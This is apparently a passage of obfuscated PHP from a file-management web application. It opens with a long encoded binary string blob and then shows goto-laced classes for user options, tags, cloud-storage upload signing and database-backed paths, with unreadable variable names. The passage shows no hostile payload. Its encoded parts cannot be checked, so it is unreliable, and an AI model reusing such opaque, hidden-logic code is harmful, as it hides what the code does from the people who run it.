xa\xb9\x5\x47\x17\xf2\x18\x19"."\122\274\1\145\150\230\224\56\156\343\161\145\74\111\312\316\355\326\204\321\17\330\60\21\47\34\375\206\323\35\210\52\25\225\307\166\56\316\310\172\22\167\226\304\25\41\372\25\340\317\43\121"."\xb3\x65\xd6\x36\x5\x28\xa\x8d\x12\xdf\xf1\xf4\xc5\x5d\xa2\xd2\xa9\x9d\x50\x34\xb9\xb6\x7b\x62\xc9\x1c\x39\xce\x3a\xdc\xc6\x82\x2c\x26\xcd\x14\x3b\xfe\x8a\x7d\x83\x3d\x1f\x83\x4\x19\x80\x1e\xdc\x35\x70\x97"."\255\122\5\356\44\127\231\0\75\65\53\52\0\360\342\334\344\160\261\104\156\14\167\345\46\316\131\33\270\17\152\331\143\53\325\106\111\166\143\26\274\232\41\214\166\130\35\3\322\336\324\227".strrev('1_ÀĞ”³W:My'."\n".'²”s9% ƒğ³ 7”öLcâOœ½o"YÎ/g˜4½¼Ğy-Öh}›Ë')."\x93\x81\x78\xaf\x2b\x9b\x69\x91\x1d\x87\xb3\xe\xbc\x27\x75\x42\x78\xcb\xbe\x6\xe9\x98\xf2\xc3\x86\x77\xde\x65\xeb\x65\x9a\x4d\x50\x24\xac\x98\x92\x9f\x6a\x54\x1d\x68\xc2\x70\x95\x59\x85\xe1\x11\x12\xf6\x17"."\116\70\205\121\365\204\343\154\70\116\10\135\132\147\317\316\3\51\44\213\12\127\20\146\57\21\307\34\16\316\1\115\153\231\54\42\27\163\246\275\265\341\62\26\270\202\345\302\303\312\37\315"."\224\117\341\360\220\252\262\346\10\257\350\26\376\262\171\11\104\164\42\133\21\126\21\276\215\53\250\345\244\120\212\341\332\331\1\50\332\101\133\124\17\352\301\140\205\276\220\255\340\167\277\117"."\162\316\117\161\1\170\113\314\104\322\43\366\377\54\27\302\165\165\270\110\324\42\7\105\344\155\245\242\33\263\150\125\46\371\152\300\332\166\22\173\110\204\322\143\141\134\341\207\156\167\242\156"."\x75\xa3\x6d\x90\xe0\x26\x30\x21\x9d\x94\x1a\xb3\x3a\x71\x93\x21\x94\x64\xf3\xa3\x38\xb9\xab\xc4\x2b\x14\xb9\x22\xc4\x75\xe3\x29\xac\xf4\xe9\x56\x48\x33\xe7\x92\x67\x28\x4a\xa4\x62\x4f\x1f\xec\x6b\xdc\x17\x36"."\120\176\224\307\264\371\326\31\127\37\110\112\354\63\54\313\267\161\132\304\73\137\64\325\141\127\40\371\341\347\131\121\63\130\343\65\326\66\142\41\112\236\61\220\166\363\256\250\333\236\26\227"."\220\44\32\24\225\70\57\341\373\66\143\335\354\225\3\141\207\112\202\202\0\277\165\315\6\26\70\107\340\121\114\62\137\54\321\76\250\225\327\211\133\40\75\76\17\2\114\136\117\230\371\44"."\x66\x88\x92\x3\x9d\xac\x1d\xd5\xfb\xe4\x28\x31\x61\x60\xab\x41\x78\x4a\x97\xab\xc0\x5e\xc9\x24\xb2\x83\x57\x61\x20\x61\x17\x64\x1f\x67\xd2\x63\xa\x28\x26\x3d\x9a\x21\x9\xa2\xde\x6a\x85\x4b\xb0\x2a\xad\x99"."\106\246\112\11\44\177\51\141\326\245\303\225\56\265\21\255\125\254\320\303\117\244\135\42\46\273\47\247\310\22\34\273\370\206\53\40\116\247\160\17\54\71\15\125\213\235\230\213\236\311\105\310"."\67\213\212\320\64\54\104\211\33\162\162\212\205\137\303\350\140\263\130\52\245\304\247\110\222\64\242\11\206\151\260\312\227\211\101\202\204\141\235\31\160\173\253\153\274\314\25\241\174\153\216\155"."\xce\x80\x8f\xa0\x85\x25\xa1\x1\xde\xde\x32\x32\x6\xe6\xcf\x90\x4f\xe4\x31\xa5\x73\x7d\xe2\xe6\x49\x38\xb4\x21\x9e\xab\xf8\x7c\x12\x17\x57\x3c\x96\x97\x64\x9\xf1\xa6\x3c\xf1\x1\x25\x93\x75\x61\xb6\x44\x2d"."\246\161\206\216\122\351\164\204\160\162\243\303\306\335\225\1\255\17\147\72\274\213\41\32\103\335\120\231\16\233\103\127\45\360\370\212\374\362\7\51\45\372\41\56\2\40\220\111\137\337\220\6"."\x46\x98\x5f\x51\xef\x58\xec\xa6\x3\x27\x72\x2\x1c\x37\x39\xb0\xd8\x84\xb\x63\x25\x54\x49\xdd\xb\xc0\x8e\xb7\xa2\x12\xbb\x17\x70\x68\x22\x5b\x87\xf9\x25\x70\x6c\xf7\x88\x99\x34\xb7\x6c\xb7\xe4\x8\x4b\xe5"."\310\151\71\42\324\316\323\121\232\203\170\256\101\235\171\12\140\73\365\366\226\166\77\7\325\363\345\111\25\45\302\371\136\3\63\246\324\207\364\4\324\225\61\22\112\70\322\34\152\10\204\33".base64_decode('Q7FFSh8+ixXGhqi5Klm2qiVemCFP6jgXONEr0+lguN7Dn3fBQW8P2kd4k3yvZYldFekhVA==')."\x26\xde\xc2\x73\x56\x4b\xb1\x52\xcf\x17\xd5\x98\xc5\x17\xfa\xd2\x45\x65\xb0\xb6\xbc\x44\xee\xb4\xd0\xd\x4b\x99\x73\x79\xbd\x38\xff\xb0\x8e\x8d\x1e\xa5\x16\x4b\x5\xa\x25\x5a\x3\xf9\x4b\x7f\x81\xbc\xc9\x23"."\347\106\342\221\236\35\257\361\106\166\300\260\14\101\16\130\211\141\271\366\100\143\153\250\115\15\204\303\221\45\16\133\141\161\116\220\347\212\224\244\374\76\222\64\63\142\22\350\327\213\75\77".strrev('ù8-¯tÒ5ã´éiÏî5µ>€éašòå—ïJ'."\n".'^şVİà½Ç4BìŸN…r—	íù=Ÿ‚')."\x6d\xc9\x4f\xa9\xf4\x3\xc\x46\x4\xdd\xf1\x33\x44\x43\xcd\x2d\xf1\xff\x71\x53\x8d\xa4\x70\xe\x68\x24\x99\x31\x1a\xbf\x25\x4d\x9f\x52\x69\x90\x5f\xae\x65\xdf\x14\xf\xf6\x14\x43\xfe\xa7\xef\xbf\x79\xc4\x49"."\x9c\x4a\x9c\xab\xb1\x87\x26\x4d\xb2\x6d\x2\x99\x9e\xc2\x42\x11\x95\xfa\x19\x13\x9f\x40\x52\x4c\x7e\x38\x27\x9f\xdd\xfa\x93\x50\x3\x76\x83\x1a\x64\xe7\x84\x38\x22\xf6\x2d\x38\x17\x54\x82\xbf\x42\x77\xb3\x68"."\223\216\25\212\154\207\303\224\163\210\214\300\200\73\14\60\135\17\330\271\115\346\35\317\323\25\175\203\274\226\102\323\310\251\25\312\331\55\372\204\142\374\165\44\121\324\235\122\242\1\50\131"."\21\52\57\236\101\251\123\252\350\133\212\374\345\33\145\36\363\5\41\76\100\134\31\6\63\71\333\261\323\157\221\257\317\110\123\102\1\130\377\223\347\12\74\72\347\54\212\47\266\216\115\246"."\52\363\116\102\207\305\376\17\333\146\232\231\341\42\200\103\73\26\146\275\341\126\322\370\265\240\154\257\51\217\72\241\347\370\6\25\175\51\225\52\42\74\150\77\242\333\305\157\256\321\342\377"."\x27\x5\x69\x62\x4c\xf2\x69\xeb\xac\xa4\xb8\x41\x96\x9b\x7f\xa\x59\xe\x3f\x27\x97\x32\x7\x9d\xcf\xa7\x62\x88\xfb\x1\x39\xc7\xd3\x71\xd2\xa\x23\x9e\xd\xe4\xc7\xee\x9c\x85\x3c\x45\xaf\x36\x29\xe4\xe5\x6b"."\5\21\43\230\173\154\335\143\311\253\134\372\364\44\372\323\5\277\214\33\272\33\101\351\34\174\262\222\243\142\103\312\110\47\363\334\156\113\0\132\165\241\175\40\245\20\141\311\151\354\205\157"."\362\264\144\43\43\351\360\120\124\251\127\5\261\3\123\347\173\127\342\31\61\301\172\235\317\52\161\313\0\113\54\41\313\166\74\344\25\67\343\132\237\207\242\52\46\212\42\126\77\54\207\145"."\xcb\x7d\xd2\xb\x94\x68\x31\xa\xca\xe7\x7b\xbe\x94\x81\xbd\xcd\x99\xf4\x90\x87\x23\x29\x5d\x74\xbf\x44\x25\xad\x4f\x4e\x7e\xe5\xd2\x7d\x69\xb3\x47\x4b\x83\x51\xa1\xe3\xbe\x5d\x1e\x6d\xd1\x74\xc6\x42\x1c\xd9"."\x28\xc8\xaf\xe5\x72\xe2\x3c\x44\xe6\xb8\xe8\x7f\xc7\x55\x6a\x48\xeb\x88\xb7\xa8\xc4\xad\x88\x4a\xd\x1a\x62\x2\xe7\xa4\x33\x4a\xa\x84\xf3\xca\x42\x36\x44\xcf\x65\x1c\xd0\xbc\xb4\x79\x94\xbd\x41\xd3\xb3\x1a".base64_decode('cSMXsqN2ttODWxgwuUp2mM717Ige8T22v/jwHdujAUUhL8zDp/tNskfzybs7yKDMUwRqOA==')."\x16\x32\x46\x25\x24\x62\xd3\xa7\x39\x9\xa5\x90\x29\xda\xd7\x40\xa5\x57\xd2\xe0\x9\xd0\x52\x8f\x9e\x51\xcc\x27\x3f\x8d\x7a\x2f\xdf\x29\xe1\xb8\x90\xd\x64\xd7\x48\xc2\x68\xc5\xfd\x3a\x67\xf1\x4b\xa3\xec\x55"."\x51\xb6\x74\xe0\x49\xd1\x12\xef\x84\x8e\xfb\xcc\xa8\x47\x5c\xbe\xfe\xba\xb7\xd4\xc4\x55\x5f\xe7\xc3\xf1\xb8\x1f\x5c\xb2\xe0\x9b\x91\xa2\xfd\x8c\x7b\x2b\xc3\x87\xd5\x55\x20\xea\x1e\xe4\xb8\x59\xac\x74\x16\xe6".strrev('õçjõIÒ\\F®¬o×5âZÜİ—¬[ä²4Ì<5,CÚ|…ß©UH~+i^¥PG	').base64_decode('5NmxtTub4cBdxIDF/T/q+7mIQSzLJGumzZgja0zEFIrD3Gn0B86kQcYRSKE40VBhDqfl1Q==').base64_decode('TxKdd22KH/51cYD/2YIRmw+aVTLfLX4ivWgECJ5KRmQSQ3TZBJnYTMcSq46yQPHcr/NbVA==')."\x7c\x28\xd1\xf\x89\xef\x89\xc5\x42\x9f\x6e\x35\xd3\x78\xe3\x9e\xc1\x7\x2\x76\x5e\x73\xee\x47\x4b\x6d\xbb\xc8\x48\xb0\x3d\x1e\xd6\xe9\x8a\x98\xd3\x6a\xa\x54\x34\x22\x59\xda\x97\xc9\x35\xda\xa6\x5b\xbf\x84".base64_decode('i2O+SHSlkWwa2Db2TCFWm0SJ/gcTyLZYdDcmzMVw9x07c+co+E9hZKbEM72SwczX9IFKeg==')."\x7c\x6b\xe9\xd5\x6c\xaf\x84\x9c\x92\x7e\x52\xb7\x23\x64\xb2\x81\x5c\x88\x1d\xb0\xb3\xdf\xae\xea\x51\x31\x51\x47\xb7\x47\x19\x2f\x53\xb1\xb8\x27\xbd\xe6\x2b\xbc\x21\x4a\x82\x1e\x2e\xcd\xee\x95\x8f\xa3\x40\x20"."\327\232\235\42\223\374\330\50\271\23\54\334\366\220\245\353\130\306\222\177\167\371\116\55\251\110\136\37\305\125\113\117\267\12\265\23\321\123\101\217\140\161\23\13\12\322\314\100\63\277\221\255"."\111\266\177\116\135\30\10\167\322\273\343\150\370\244\247\271\115\71\54\75\11\214\170\102\204\335\252\100\315\161\154\143\121\274\321\365\154\73\241\137\356\267\334\331\230\21\242\41\350\241\164\323"."\337\261\125\342\257\131\72\266\116\226\373\111\133\44\12\72\136\40\111\26\275\2\16\204\223\334\253\243\137\223\130\257\340\262\42\324\126\310\210\210\244\121\46\373\55\236\350\160\210\200\175\376"."\xb9\x68\x4\x73\xb3\x60\xb9\x5e\xba\xa6\xe\xcb\x69\x98\x6d\xb\xfe\xaf\x5f\x73\xfd\x7f\xf5\x88\xeb\x8c\x2a\xa6\xfb\x77\x3c\xfe\xde\xc\xc2\x39\xb4\x16\x1f\xb0\x72\x5d\x7\xd5\x3b\xbb\xfa\xe1\x64\xaf\x7\x3"."\x16\xa1\xc1\xf7\x49\x6f\xcf\x93\x38\xb7\x2d\x67\x7e\x1f\x99\x3b\x48\x8d\x9d\xbf\x69\xe9\xb4\xc4\x84\x4b\x6f\x67\x8a\x9e\xd8\x46\xc8\xd7\xcf\x9f\x65\x2e\x15\x71\xdf\x1a\x76\x3f\xb7\xdd\x49\xd4\xbe\xec\x25\xed"."\356\122\31\5\135\342\273\246\22\170\114\101\114\130\26\64\51\153\44\372\113\34\236\23\13\132\347\3\3\222\160\122\224\115\264\1\311\60\314\241\246\237\205\22\170\273\110\234\307\300\350\311"."\x17\xfc\x23\x39\xb6\xb1\xac\x4\x2e\xd0\x7d\xa\xa3\x56\xc4\xa9\x8\x10\x2d\x99\x50\x39\x40\x45\xe4\x2d\xee\x98\x13\x7\x50\x1e\x6e\x41\x83\x7c\x6c\x3a\x1d\x25\x5a\x5d\xaf\x7\xd3\x4c\x96\x3c\xb6\x8e\xf3\x2"."\x22\xef\xe4\xa\x6e\xf\xfc\x74\x6b\x24\x97\x92\xcd\x2d\x8a\x3f\xc0\x49\x85\x5c\x4\x5b\xfd\x3b\xb5\x67\x18\x7\x70\xdb\xbd\x55\x5e\x17\xa0\xda\xeb\xaa\x8e\xbf\xb1\xec\x5c\xe\x8e\x47\x7f\xa9\x89\xa\x5a\x43"."\121\254\45\141\332\62\162\52\105\216\247\275\305\145\50\352\307\104\236\161\26\137\151\22\300\33\45\64\206\70\44\217\7\43\45\355\171\223\214\255\23\312\65\107\222\271\165\102\122\313\272\305"."\103\12\236\344\53\142\154\214\252\72\46\23\333\364\211\323\320\170\44\32\124\227\204\260\277\212\320\151\301\16\346\151\331\60\311\33\47\254\312\216\326\12\162\345\15\326\10\332\350\64\231\2"."\333\164\104\357\44\35\261\160\27\154\147\162\15\374\354\326\171\161\132\272\136\301\234\165\311\132\113\147\146\174\107\306\271\134\347\227\312\226\60\363\226\354\153\323\221\210\45\63\23\245\106\331"."\x56\xbb\x23\x8b\xd6\xba\x9e\xb0\xf5\xa4\x82\x79\xbc\x43\xec\xef\x9c\x5e\x35\xad\xfb\xeb\x6a\x99\xce\x9e\x4b\x43\x39\xa7\x7f\x43\x4e\xd8\x7f\xc4\xa6\x79\x99\xf9\x2f\xcb\x53\xb2\x9c\x49\x9d\xeb\x94\x4a\xc3\xcf".strrev('ÃØüëM‚§½š€ü°7ŠŸŒz˜i\\>ƒfm73$/áq'."\n".'¨´•ª®8riÆ¸ä$ÛÙ')."\27\276\333\341\47\370\7\312\357\145\152\106\145\226\106\130\155\40\224\77\204\50\27\157\33\341\113\166\176\70\222\217\146\370\225\16\242\360\241\72\34\207\52\7\14\12\144\220\164\300\216\366"."\x63\x49\xe7\x93\x62\x24\x91\x80\x99\x4b\x6f\xa8\x41\x3a\x22\x76\x9e\xd0\xf3\xcb\xb0\x45\x2c\xb2\x60\x84\xa5\x64\x52\x8a\xb9\x86\x45\xbf\xf8\x5e\x7f\x48\xf8\x57\x22\xc9\xf4\x98\x2b\x30\xa0\x71\x17\x66\xee\x52".base64_decode('HY69rnSenyAUIlh8ZCtOkiUBkxXDm2XB+11wiaIKtqgNCHFZbNeSySZtoETWpO52QYcgPA==')."\53\21\267\45\207\34\342\236\215\76\50\177\35\362\211\153\60\216\214\305\120\341\260\103\52\57\216\351\104\67\61\254\124\367\11\205\163\26\227\35\202\160\244\22\40\372\144\24\67\176\221\266"."\306\330\72\110\130\305\320\256\160\15\220\370\244\323\375\10\317\306\347\14\345\41\327\363\274\16\250\153\263\217\225\155\114\124\164\45\201\372\111\252\276\244\226\112\102\1\75\35\226\252\223\217"."\360\307\55\20\53\375\21\201\225\316\41\226\374\266\210\4\46\325\230\216\301\227\170\26\357\30\344\214\312\211\216\346\270\247\226\354\115\5\372\122\140\206\150\372\151\132\300\231\104\363\353\256"."\xd6\xcb\x5\xdc\x3d\xa3\x25\x1c\xaf\x9\xca\xf0\x41\xc3\x4e\xa4\xa4\x8d\x74\x71\x62\x31\x3c\x5f\x34\xd8\xd0\x80\xd2\xfd\x70\xb7\x96\x8d\xb5\x5b\xbd\x20\x2a\x29\x6a\x8f\x64\x1f\x14\x37\x4b\x94\xa1\x2d\x2a\x59"."\214\46\341\222\142\377\342\50\73\316\20\340\262\64\11\227\55\112\146\205\213\306\225\224\263\265\202\65\116\367\212\7\17\324\125\311\22\35\26\112\35\51\353\170\343\131\62\163\361\347\0\23".strrev('2ÌTa\'{\\hT¦¥¥,Û¢”£““Y‡©jMàs!nw'."\n".'Û3%ªQ‘eÊZ„+t«~‰¹İ')."\x44\x5a\x9\x8b\x24\xfa\x49\x2c\xfd\xc8\xbe\x1e\x4b\x24\xcb\xe6\x4d\xa5\xd\xa0\xa2\x25\xa9\x8c\xe5\xb4\x4c\x72\xc1\xe5\x1\x2\x6f\xe4\x20\x41\x3\x2\x23\x11\x2c\x6d\xf4\xb\xcb\x4f\x76\xf1\x63\x92\x83\x95".strrev('óçNèHÛM«n8Â‚Ëñ­&–±Qİ`ñCŞKá~H-Ÿ¨œÚ¢çï S’Åì0¤§³“Yı²')."\xb2\xcb\x47\x9a\xce\x3e\x92\x96\x34\xd5\x2e\x25\xb1\xd0\x64\x39\x6c\x64\x4a\xa8\x4e\x9\x8\x24\x66\x71\x5e\x43\xeb\x93\x84\x23\x81\x13\x8e\x6b\x62\x54\x24\x81\x63\x2e\x7a\x42\xde\x80\xcd\x36\xf8\xd9\x28\xf1".base64_decode('gE5ZOE2OmXnbg9PiZo781pu2LQxOqOqIiNmYD3skeyoUEgehuFHkhI2gLaFYJAhn9VgnEw==')."\323\151\52\241\163\216\10\76\271\343\21\231\315\302\231\175\123\301\145\125\40\0\375\146\262\307\34\142\176\26\21\136\111\203\44\316\366\64\267\154\51\304\42\100\105\331\72\214\370\51\261\374".base64_decode('NMUPLx15SR3wSqpvRa7PUZy+O8ltu7+uBtDviyroMydE2QrX2GLxWFFSeyAWWxKJNtJXUQ==')."\212\222\111\51\311\6\257\50\251\275\45\322\66\136\132\260\65\20\12\27\245\141\163\275\66\125\170\354\244\111\241\166\322\112\162\74\75\136\53\102\15\213\104\113\212\35\245\262\343\264\60\74".base64_decode('pCnmRTpeyqVMdmrE8se0NNMXSccPeka4dBVlnGowef4t5nuZB5xPEbqsZxliQ0XY+K4N6g==').base64_decode('juYAil+T4fSBy/nCAsTnsBSR4GQNEaIk4abM7wlgSskBko8jio/KSKoYANywhSbYc64wew==')."\xa4\xa3\x30\xba\xcb\x82\x2b\xea\x30\xa4\x92\x81\x25\xd\x3b\x92\x6d\xad\xaf\xa4\xc1\x4\xd5\x32\x63\x2a\x21\xf4\xbf\xff\x1b\x47\xbf\xb8\x6e\x2f\xb8\x0\x0".base64_decode('').""."".""."", 10, -8))); goto FÙÉ˜­¼–; dÌºŞÈĞéÊ: class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\163\x65\x72\x5f\x6f\160\164\151\x6f\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($ïÁˆêéÖ) { $ºß¬œğ« =& $_SERVER[‹è™Ü¸Ñ]; $ÈÅŒğÍá = defined($ºß¬œğ«[2177]) && USER_ID ? USER_ID : $ºß¬œğ«[12]; return "\125\x73\145\162\x4f\160\x74\x69\x6f\x6e\137{$ïÁˆêéÖ}\137" . $ÈÅŒğÍá; } protected function filterWhere($Á‹‘ÖˆÌ) { $ûÙ è¤£ =& $_SERVER[‹è™Ü¸Ñ]; $Á‹‘ÖˆÌ[$ûÙ è¤£[1752]] = defined($ûÙ è¤£[2177]) && USER_ID ? USER_ID : $ûÙ è¤£[12]; return $Á‹‘ÖˆÌ; } public function cacheRemoveUser($»õÅó¹¸, $º¡ĞÙÙ) { return Cache::remove("\125\163\x65\x72\117\x70\164\151\157\156\x5f{$»õÅó¹¸}\x5f" . $º¡ĞÙÙ); } protected function optionDefault($ó¶ú¸šŒ = '') { $İªğ»äÊ =& $_SERVER[‹è™Ü¸Ñ]; if ($ó¶ú¸šŒ == $İªğ»äÊ[12]) { return $GLOBALS[$İªğ»äÊ[6]][$İªğ»äÊ[2479]]; } if ($ó¶ú¸šŒ == $İªğ»äÊ[2480]) { return $GLOBALS[$İªğ»äÊ[6]][$İªğ»äÊ[2481]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\125\163\145\162\x2e\164\x61\147\114\x69\x73\x74"; public $modelType = "\x55\x73\145\162\117\x70\x74\151\157\156"; public $field = array("\156\x61\155\145", "\163\x74\x79\154\x65", "\163\157\162\164"); public function listData($èâ•Ûù½ = false, $áúã¿æ = "\x73\x6f\x72\x74", $³÷ã€  = false) { return parent::listData($èâ•Ûù½, $áúã¿æ, $³÷ã€ ); } public function remove($ŞÒ©‘¬) { return parent::remove($ŞÒ©‘¬); } public function add($µ»î¬¾Ã, $¨åÁôùğ = "\154\141\x62\x65\x6c\55\147\162\145\x79\x2d\156\157\x72\x6d\x61\x6c") { $¦£àè²§ =& $_SERVER[‹è™Ü¸Ñ]; if ($this->findByName($µ»î¬¾Ã)) { return !1; } $Ÿ•Ôö°¦ = array($¦£àè²§[494] => $µ»î¬¾Ã, $¦£àè²§[558] => $¨åÁôùğ, $¦£àè²§[1955] => $this->getSort($¦£àè²§[335]) + 1); return parent::insert($Ÿ•Ôö°¦); } public function update($á–ÎêôÚ, $½Ò²ğ™û) { $²ìİ²ØÃ =& $_SERVER[‹è™Ü¸Ñ]; $§Øª¾·• = $this->listData($á–ÎêôÚ); $îè“šæÜ = $this->findByName($½Ò²ğ™û[$²ìİ²ØÃ[32]]); if (!$§Øª¾·• || $îè“šæÜ && $îè“šæÜ[$²ìİ²ØÃ[475]] != $§Øª¾·•[$²ìİ²ØÃ[475]]) { return !1; } return parent::update($á–ÎêôÚ, $½Ò²ğ™û); } public function moveTop($½ÊÛçñÅ) { $òàÏ¨í =& $_SERVER[‹è™Ü¸Ñ]; $áéã«€¢ = parent::listData(); $õ±„Æ‡ = $this->getSort($òàÏ¨í[334]); foreach ($áéã«€¢ as &$‡…î˜²©) { if ($‡…î˜²©[$òàÏ¨í[475]] == $½ÊÛçñÅ) { $‡…î˜²©[$òàÏ¨í[1975]] = $õ±„Æ‡; continue; } $‡…î˜²©[$òàÏ¨í[1975]] += 1; } unset($‡…î˜²©); return parent::resetData($áéã«€¢); } public function moveBottom($èÅ®óæ€) { $÷µ„†ÑÊ =& $_SERVER[‹è™Ü¸Ñ]; $âß¾ÙæÒ = $this->getSort($÷µ„†ÑÊ[335]) + 1; return parent::update($èÅ®óæ€, array($÷µ„†ÑÊ[1975] => $âß¾ÙæÒ)); } public function resetSort($î¥Ë¤ï÷) { $¯¯Š–ß =& $_SERVER[‹è™Ü¸Ñ]; $­ìÏëˆ = array(); $î¥Ë¤ï÷ = is_array($î¥Ë¤ï÷) ? $î¥Ë¤ï÷ : array(); for ($ààëØ” = 0; $ààëØ” < count($î¥Ë¤ï÷); $ààëØ”++) { $­ìÏëˆ[$î¥Ë¤ï÷[$ààëØ”] . $¯¯Š–ß[12]] = $ààëØ” + 1; } $”µ¨á‹¯ = parent::listData(); foreach ($”µ¨á‹¯ as &$˜‘ÛØ¿Ì) { $Øåê¤ı¡ = $­ìÏëˆ[$˜‘ÛØ¿Ì[$¯¯Š–ß[475]]]; $˜‘ÛØ¿Ì[$¯¯Š–ß[1975]] = $Øåê¤ı¡ ? $Øåê¤ı¡ : $˜‘ÛØ¿Ì[$¯¯Š–ß[1975]]; } unset($˜‘ÛØ¿Ì); return parent::resetData($”µ¨á‹¯); } private function getSort($©·ëÙš‹) { $ç©æ“ı‚ =& $_SERVER[‹è™Ü¸Ñ]; $ô×±Øé™ = parent::listData(); $×°Å¹€° = array_to_keyvalue($ô×±Øé™, $ç©æ“ı‚[12], $ç©æ“ı‚[1975]); if (!$×°Å¹€°) { $×°Å¹€° = array(0); } $ïúÀÔÛò = $©·ëÙš‹ == $ç©æ“ı‚[335] ? max($×°Å¹€°) : min($×°Å¹€°); return intval($ïúÀÔÛò); } } goto Cº©ƒÂ¤“; BİŒ„»ëø: class PathDriverCOS extends PathDriverBaseS3 { public function __construct($¼ˆ–ƒ›¬) { parent::__construct($¼ˆ–ƒ›¬); $this->setSignVersion($_SERVER[‹è™Ü¸Ñ][247]); } public function uploadFormData($æÑ¨Ïª×, $ŒÕ™•’ç = 3600) { $¹¶ÅÛİ =& $_SERVER[‹è™Ü¸Ñ]; $Öˆ§èÈ = $¹¶ÅÛİ[229]; $ßå¤÷³ = $¹¶ÅÛİ[263]; $‡£¹Á©Ü = $¹¶ÅÛİ[274]; $³·îÉú¥ = gmdate($¹¶ÅÛİ[299], time() + $ŒÕ™•’ç); $á×Å”ç³ = (string) time() . $¹¶ÅÛİ[74] . (string) (time() + $ŒÕ™•’ç); $—ˆÁçèÈ = array($¹¶ÅÛİ[275] => $³·îÉú¥, $¹¶ÅÛİ[278] => array(array($¹¶ÅÛİ[280] => $Öˆ§èÈ), array($¹¶ÅÛİ[279] => $this->bucket), array($¹¶ÅÛİ[281], $¹¶ÅÛİ[282], $¹¶ÅÛİ[12]), array($¹¶ÅÛİ[285] => $‡£¹Á©Ü), array($¹¶ÅÛİ[1391] => $ßå¤÷³), array($¹¶ÅÛİ[1392] => $this->accessKey), array($¹¶ÅÛİ[1393] => $á×Å”ç³))); $—ˆÁçèÈ = json_encode($—ˆÁçèÈ); $È³¤»»Æ = hash_hmac($¹¶ÅÛİ[263], $á×Å”ç³, $this->secret); $˜Ä™î˜‹ = sha1($—ˆÁçèÈ); $÷¦º™À– = hash_hmac($¹¶ÅÛİ[263], $˜Ä™î˜‹, $È³¤»»Æ); $³¬Ø–ì– = array($¹¶ÅÛİ[280] => $Öˆ§èÈ, $¹¶ÅÛİ[285] => $‡£¹Á©Ü, $¹¶ÅÛİ[293] => base64_encode($—ˆÁçèÈ), $¹¶ÅÛİ[1391] => $ßå¤÷³, $¹¶ÅÛİ[1392] => $this->accessKey, $¹¶ÅÛİ[1394] => $á×Å”ç³, $¹¶ÅÛİ[1395] => $÷¦º™À–, $¹¶ÅÛİ[208] => $this->getHost()); return $³¬Ø–ì–; } public function fileOutImage($óšçç, $ˆÃÃÊÌ = 250) { $áÀñå´Ë =& $_SERVER[‹è™Ü¸Ñ]; if ($this->size($óšçç) > 1024 * 1024 * 32) { return $this->fileOutImageServer($óšçç, $ˆÃÃÊÌ); } $¡œ·×Ñ¶ = $this->link($óšçç); $¡œ·×Ñ¶ .= $áÀñå´Ë[1396] . $ˆÃÃÊÌ . $áÀñå´Ë[1397]; $this->fileOutLink($¡œ·×Ñ¶); } public function fileOutLink($ÍÍçªƒ«) { $ÑªäÉ¹‡ =& $_SERVER[‹è™Ü¸Ñ]; if (substr($ÍÍçªƒ«, 0, 7) == $ÑªäÉ¹‡[313]) { $ÍÍçªƒ« = $ÑªäÉ¹‡[314] . substr($ÍÍçªƒ«, 7); } header($ÑªäÉ¹‡[175] . $ÍÍçªƒ«); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($ñàÏ‘”ş) { $this->pathParse = $ñàÏ‘”ş; $this->model = Model($_SERVER[‹è™Ü¸Ñ][1398]); } public function getPath($é·¥±Ş) { return trim($é·¥±Ş, $_SERVER[‹è™Ü¸Ñ][8]); } public function pathFather($ØÜË¤î§) { $õš¯‰‚Î = $this->parse($ØÜË¤î§); $õš¯‰‚Î = $this->infoSimple($ØÜË¤î§); return $õš¯‰‚Î ? $õš¯‰‚Î[$_SERVER[‹è™Ü¸Ñ][192]] : !1; } public function pathThis($®»ÓµÄ¾) { $ÕòÒ“ˆø = $this->infoSimple($®»ÓµÄ¾); return $ÕòÒ“ˆø ? $ÕòÒ“ˆø[$_SERVER[‹è™Ü¸Ñ][32]] : !1; } public function getPathOuter($Œ€µˆÇ) { if (!$Œ€µˆÇ) { return $Œ€µˆÇ; } $¹²ïšÒù = $this->parse($Œ€µˆÇ); return KodIO::make($¹²ïšÒù[$_SERVER[‹è™Ü¸Ñ][475]]); } public function copyFolderFromIO($šØş¢¢, $âÚÌöà˜, $ó¹ÙäÏÉ, $°áÃ¿È¾, $æÙ¯ìÍ) { $äË¦Ø¶ë = $this->model->copyFolderFromIO($šØş¢¢, $âÚÌöà˜, $ó¹ÙäÏÉ, $°áÃ¿È¾, $æÙ¯ìÍ); return KodIO::make($äË¦Ø¶ë); } public function isParentOf($ˆèÜø›, $¼½µ†) { return $this->model->isParentOf($ˆèÜø›, $¼½µ†); } public function mkfile($øÉˆàÆ†, $³‰ªíåû = '', $§®ŸÙ© = REPEAT_RENAME) { $ˆÄãÕ =& $_SERVER[‹è™Ü¸Ñ]; $ÅÆ»¡¸“ = $this->parse($øÉˆàÆ†); $øÉˆàÆ† = $ÅÆ»¡¸“[$ˆÄãÕ[475]]; for ($“èê½Öï = 0; $“èê½Öï < count($ÅÆ»¡¸“[$ˆÄãÕ[1399]]); $“èê½Öï++) { $­äšÆÄœ = $ÅÆ»¡¸“[$ˆÄãÕ[1399]][$“èê½Öï]; if ($“èê½Öï == count($ÅÆ»¡¸“[$ˆÄãÕ[1399]]) - 1) { $øÉˆàÆ† = $this->model->mkfile($øÉˆàÆ†, $­äšÆÄœ, $³‰ªíåû, $§®ŸÙ©); break; } $øÉˆàÆ† = $this->model->mkdir($øÉˆàÆ†, $­äšÆÄœ, REPEAT_SKIP); } return $this->getPathOuter($øÉˆàÆ†); } public function mkdir($©şä’¦Ø, $ûÕÁ‰ØÎ = REPEAT_SKIP) { $£‡¦Œ‡Ï =& $_SERVER[‹è™Ü¸Ñ]; $¡•ÇÕÆå = $this->parse($©şä’¦Ø); $©şä’¦Ø = $¡•ÇÕÆå[$£‡¦Œ‡Ï[475]]; for ($æÎªã—ƒ = 0; $æÎªã—ƒ < count($¡•ÇÕÆå[$£‡¦Œ‡Ï[1399]]); $æÎªã—ƒ++) { $Ğ›Ìà¾ = $¡•ÇÕÆå[$£‡¦Œ‡Ï[1399]][$æÎªã—ƒ]; $©şä’¦Ø = $this->model->mkdir($©şä’¦Ø, $Ğ›Ìà¾, $ûÕÁ‰ØÎ); } return $this->getPathOuter($©şä’¦Ø); } public function 